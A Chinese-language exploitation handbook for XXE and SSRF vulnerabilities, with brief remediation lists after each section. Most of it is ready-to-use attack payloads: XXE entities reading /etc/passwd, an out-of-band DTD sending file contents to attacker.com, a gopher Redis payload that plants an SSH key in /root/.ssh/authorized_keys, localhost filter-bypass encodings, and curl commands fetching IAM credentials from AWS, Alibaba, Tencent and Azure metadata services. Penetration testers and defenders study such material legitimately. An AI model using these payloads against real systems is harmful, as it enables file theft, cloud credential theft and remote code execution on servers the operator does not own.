# XXE 与 SSRF 深度利用手册

> XXE（XML External Entity Injection）与 SSRF（Server-Side Request Forgery）是两类容易被忽视但威力巨大的"服务端主动请求"漏洞。它们可以读取本地文件、探测内网、甚至在特定环境下导致 RCE。

## 1. XXE 注入原理与基础利用

XML 文档允许在 DTD 中定义 "外部实体"，若解析器未禁用外部实体，攻击者可声明指向本地文件 / 远程 URL 的实体：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

### 1.1 直接回显的 XXE

当解析结果会回显到页面时，最简单的 payload 就是读取 `/etc/passwd`、`C:\Windows\win.ini` 等系统敏感文件：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

支持的协议与可读取路径取决于具体 XML 解析库：

| 解析库 | 支持的典型协议 |
|--------|---------------|
| Java (SAX/DOM/JAXB) | `file://`、`http://`、`ftp://`、`jar://` |
| PHP (libxml2) | `file://`、`http://`、`php://`、`compress.zlib://` |
| .NET (XmlReader 默认关闭) | `file://`、`http://` |
| Python (lxml 默认关闭) | `file://`、`http://` |

### 1.2 Blind XXE（无回显）+ OOB 通道

当解析结果不回显时，需要借助外部 HTTP / DNS 信道带出数据。核心思路：

1. 引用外部 DTD（`http://attacker.com/evil.dtd`）
2. 在 evil.dtd 中定义参数实体，将文件内容拼接到请求

```xml
<?xml version="1.0"?>
<!DOCTYPE root[
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

`evil.dtd` 内容：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

由于 XML 对参数实体的解析特性，需要合理使用 `%` 和 `&#x25;` 构建双层注入。

### 1.3 XXE 进阶：XXE → SSRF / RCE

在部分解析器上，`netdoc://`、`jar://`、`gopher://` 等协议可实现：

```
# 通过 XXE 发起对内网 Redis / FastCGI 的攻击（gopher 协议）
<!ENTITY ssrf SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...">

# 读取上传文件中的 JAR 包
<!ENTITY jar SYSTEM "jar:file:///tmp/shell.jar!/META-INF/MANIFEST.MF">
```

某些 Java 环境下，`jar://` 协议可导致反序列化 RCE（如上传恶意 JAR + XXE 触发）。

### 1.4 XXE XInclude 注入

当应用只允许 XML 中的指定元素，攻击者无法控制 DOCTYPE 时，可尝试使用 `XInclude`：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 1.5 XXE 修复思路

- **禁用外部实体**
  - Java: `XMLConstants.FEATURE_SECURE_PROCESSING = true`
  - PHP: `libxml_disable_entity_loader(true);`
  - .NET: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`
  - Python: `resolve_entities=False`
- **禁用 XInclude 解析**
- **XML 字段白名单化**：尽量使用 JSON，避免 XML 解析

---

## 2. SSRF 深度利用

SSRF 的本质是**服务端主动请求攻击者可控的 URL**，带来两类核心危害：

1. 读取 / 探测攻击者不可直接访问的网络（内网、云元数据）
2. 攻击内网服务（Redis、MongoDB、MySQL、Elasticsearch）

### 2.1 常见 SSRF 入口点

```
/api/proxy?url=http://...
/api/getImage?src=http://...
/api/fetch?r=file://etc/passwd
/api/rss?feed=http://attacker.com/evil.xml
/api/webhook?target=http://127.0.0.1:9200
```

### 2.2 可用于攻击的协议与场景

| 协议 | 用途 | 示例 |
|------|------|------|
| `http://` / `https://` | 内网 Web、管理后台、Jenkins、JBoss、Redis HTTP 接口 | `http://127.0.0.1:8080` |
| `file://` | 读取本地文件 | `file:///etc/passwd` |
| `dict://` | 探测端口（返回 banner） | `dict://127.0.0.1:6379/INFO` |
| `gopher://` | 构造任意 TCP 包，攻击 Redis / MySQL / FastCGI | `gopher://127.0.0.1:3306/_xxxx` |
| `ftp://` | 访问 FTP 服务、探测内网 FTP | `ftp://127.0.0.1:21` |
| `tftp://` | 无状态 UDP 服务探测（在 libcurl 中支持） | `tftp://127.0.0.1:69/evil` |

### 2.3 绕过过滤的常见技巧

```bash
# 127.0.0.1 的多种写法
127.0.0.1
127.1
0.0.0.0
0
2130706433        # 十进制
0x7f000001        # 十六进制
[::1]             # IPv6
0177.0.0.1        # 八进制

# 利用 DNS 解析到内网
http://attacker.com        # A 记录指向 127.0.0.1
http://127.0.0.1.xip.io    # xip.io 服务
http://malware.co          # 绑定 10.x.x.x

# 302 跳转绕过（需 SSRF 客户端跟随跳转）
# 攻击者服务器返回：
# Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 封闭字符 / 短地址 / DNS Rebinding
http://tinyurl.com/xxxx  # 短地址指向内网

# 利用 URL 解析差异
# 场景：后端先验证 host 为 example.com，再用另一个 HTTP 客户端实际请求
# Java URL vs Apache HttpClient vs curl 对 @ 的处理不同
http://example.com@127.0.0.1/
http://127.0.0.1#example.com/
```

### 2.4 云元数据攻击（Cloud Metadata）

云厂商提供 169.254.169.254 的元数据接口，SSRF 一旦命中可直接拿到临时密钥：

```bash
# AWS (IMDSv1 不需要 Token，IMDSv2 需要先 PUT /latest/api/token 获取)
# 获取 IAM 角色临时凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

# 阿里云
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/role-name

# 腾讯云
curl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/role-name

# Azure
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 2.5 Gopher 协议攻击内网服务

**攻击 Redis（写入 SSH 公钥 / 定时任务）：**

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$xx%0d%0a\n\n\nssh-rsa AAAA...\n\n\n%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$11%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

**攻击 MySQL（伪造客户端问候，读文件）：** 使用构造好的握手包，读取 MySQL 可访问的本地文件。

**攻击 FastCGI：** 通过 Gopher 向 127.0.0.1:9000 发包，实现任意 PHP 文件 include / 代码执行。

### 2.6 SSRF → RCE 的路径总结

```
SSRF
├── Web 框架后台 → GETSHELL (如 Jenkins Groovy Script, JBoss JMXConsole)
├── Redis 未授权 → 写入 SSH Key / 写入 Web Shell / 主从复制 RCE
├── MySQL 未授权 → 读取 / 写入文件 (LOAD DATA / INTO OUTFILE)
├── Elasticsearch 旧版本 → Groovy / Lucene 表达式 RCE
├── Memcached / MongoDB → 写文件、注入命令
├── Docker Remote API (2375) → 创建容器，挂载宿主机文件系统
├── Zookeeper / Kafka 管理接口 → 越权操作
└── 云元数据接口 → 获取 AK/SK，控制整个云账号
```

### 2.7 SSRF 修复建议

1. **禁用不必要的协议**：仅允许 `http / https`，禁止 `file://`、`gopher://`、`dict://`
2. **URL 白名单**：限定可访问的域名 / 前缀
3. **不跟随 301/302 跳转**：或在跳转后二次校验目标
4. **限制内网访问**：路由层面 / 网络 ACL 阻止 SSRF 流量进入内网
5. **认证保护**：元数据接口要求 Token（如 AWS IMDSv2），Redis / MySQL 强制密码 + 绑定内网
6. **统一 SSRF 网关**：对外请求使用专用 egress，可审计、可限制

---

> XXE 与 SSRF 的防御难度在于"协议与解析库差异"。黑盒测试需同时覆盖多种 URL 协议与绕过技巧；白盒审计要重点关注 URL 参数、XML 解析、RSS 订阅、图片抓取等服务端发起请求的代码路径。
